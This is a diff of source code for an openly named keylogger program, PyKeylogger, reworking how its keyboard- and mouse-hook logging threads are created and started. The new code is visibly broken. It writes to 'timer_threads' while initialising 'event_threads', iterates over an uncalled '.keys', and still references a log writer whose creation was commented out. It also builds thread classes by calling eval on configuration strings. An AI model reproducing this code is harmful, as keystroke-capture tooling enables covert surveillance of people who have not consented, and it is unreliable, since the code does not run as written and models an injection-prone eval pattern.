@@ -47,8 +47,7 @@ from controlpanel import PyKeyloggerControlPanel
 from supportscreen import SupportScreen, ExpirationScreen
 import Tkinter, tkMessageBox
 import myutils
-import Queue
-from Queue import Empty # to avoid some weird exceptions on exit
+from Queue import Empty, Queue
 import threading
 import logging
 from myutils import _settings, _cmdoptions
@@ -68,14 +67,14 @@ class KeyLogger:
         self.process_settings()
         os.chdir(self.settings['General']['Log Directory'])
         self.create_loggers()
-        self.q_logwriter = Queue.Queue(0)
-        self.q_imagewriter = Queue.Queue(0)
-        self.lw = LogWriter(self.settings,
-                            self.cmdoptions,
-                            self.q_logwriter)
-        self.iw = ImageWriter(self.settings,
-                              self.cmdoptions,
-                              self.q_imagewriter)
+        #self.q_logwriter = Queue.Queue(0)
+        #self.q_imagewriter = Queue.Queue(0)
+        #self.lw = LogWriter(self.settings,
+                            #self.cmdoptions,
+                            #self.q_logwriter)
+        #self.iw = ImageWriter(self.settings,
+                              #self.cmdoptions,
+                              #self.q_imagewriter)
         if os.name == 'posix':
             self.hashchecker = ControlKeyMonitor(self.cmdoptions,
                                                  self.lw,
@@ -88,7 +87,7 @@ class KeyLogger:
             self.hm.KeyDown = self.OnKeyDownEvent
             self.hm.KeyUp = self.OnKeyUpEvent
         
-        if self.settings['Image Capture']['Capture Clicks'] == True:
+        if self.settings['General']['Hook Mouse'] == True:
             self.hm.HookMouse()
             self.hm.MouseAllButtonsDown = self.OnMouseDownEvent
         
@@ -97,10 +96,26 @@ class KeyLogger:
         
         #if self.options.hookMouse == True:
         #   self.hm.HookMouse()
-
+    
+    def spawn_event_threads(self):
+        self.event_threads = {}
+        self.queues = {}
+        for section in self.settings.sections:
+            try:
+                threadname = section['General']['_Thread_Class']
+                self.queues[threadname] = Queue(0)
+                self.timer_threads[threadname] = \
+                        eval(section['General']['_Thread_Class'] + \
+                        '(self.queues[threadname], section.name)') ## confirm the section.name bit
+            except KeyError:
+                pass # this is not a thread to be started.
+    
     def start(self):
-        self.lw.start()
-        self.iw.start()
+        #self.lw.start()
+        #self.iw.start()
+        for key in self.event_threads.keys:
+            self.event_threads[key].start()
+        
         if os.name == 'nt':
             pythoncom.PumpMessages()
         if os.name == 'posix':
